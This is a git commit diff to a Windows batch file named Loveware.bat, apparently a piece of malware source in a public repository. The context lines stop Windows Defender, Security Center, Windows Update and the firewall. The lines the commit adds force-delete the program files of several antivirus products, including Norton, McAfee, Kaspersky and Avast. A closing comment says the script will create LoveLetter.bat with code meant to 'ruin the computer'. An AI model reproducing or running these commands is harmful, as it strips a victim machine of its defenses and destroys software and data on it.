18ce69a8e46e39af3b47008ec7b799b4feeb6dab
TheG0df2ther <63458929+TheG0df2ther@users.noreply.github.com>
2020-05-23 16:49:37 +0200

    LOVEWARE

--- Loveware/Loveware.bat
+++ Loveware/Loveware.bat
@@ -96,11 +96,24 @@ net stop "SDRSVC"
 net stop "WinDefend"
 taskkill /f /t /im "MSASCui.exe"
 net stop "security center"
-net stop sharedaccess
 netsh firewall set opmode mode-disable
 net stop "wuauserv"
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
+
+del /Q /F C:\Program Files\alwils~1\avast4\*.*
+del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
+del /Q /F C:\Program Files\kasper~1\*.exe
+del /Q /F C:\Program Files\trojan~1\*.exe
+del /Q /F C:\Program Files\f-prot95\*.dll
+del /Q /F C:\Program Files\tbav\*.dat
+del /Q /F C:\Program Files\avpersonal\*.vdf
+del /Q /F C:\Program Files\Norton~1\*.cnt
+del /Q /F C:\Program Files\Mcafee\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
+del /Q /F C:\Program Files\Norton~1\*.*
 
 :: Make new file called LoveLetter.bat. It contains code that
 :: will ruin the computer.
